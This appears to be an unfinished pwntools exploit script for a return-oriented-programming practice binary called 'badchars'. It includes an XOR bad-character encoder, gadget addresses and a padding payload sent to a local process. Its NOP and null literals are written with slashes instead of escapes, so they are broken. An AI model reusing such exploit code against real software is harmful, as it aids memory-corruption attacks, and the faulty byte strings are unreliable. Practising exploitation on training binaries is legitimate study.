#!/usr/bin/env python3
from pwn import *
import sys

nop = b"/x90"
null = b"/x00"

badchars = [0x78, 0x67, 0x61, 0x2e]
key = 0x0A

xor_r15_r14 = p64(0x0000000000400628)
xor_rdi_dh = p64(0x0000000000400629)


def XorPayload(payload: bytes) -> bytes:

	global key, badchars
	xor_payload = bytearray(payload)
	bad_bytes = bytearray(badchars)

	for i in range(len(xor_payload)):
		xor_payload[i] ^= key

		if xor_payload[i] in bad_bytes:
			print(" ! bad character found in the encoded payload. What should we do??")
			print(" ! position {} -> {}".format(i, hex(xor_payload[i])))
			exit(1)

	print("final payload: {}".format(''.join('\\x{:02x}'.format(i) for i in xor_payload)))
	return bytes(xor_payload)


def Generate() -> bytes:

	global nop
	length = 0x2
	payload = (nop * (length + 8)) + b"BBBB"
	return payload


if __name__ == "__main__":

	p = process("badchars")
	context.update(arch="amd64", os="linux")

	if len(sys.argv) > 1:
		if sys.argv[1] == "gdb":
			gdb.attach(p)

	payload = Generate()
	xor_payload = XorPayload(payload)

	p.send(xor_payload)
	print(p.recvall())

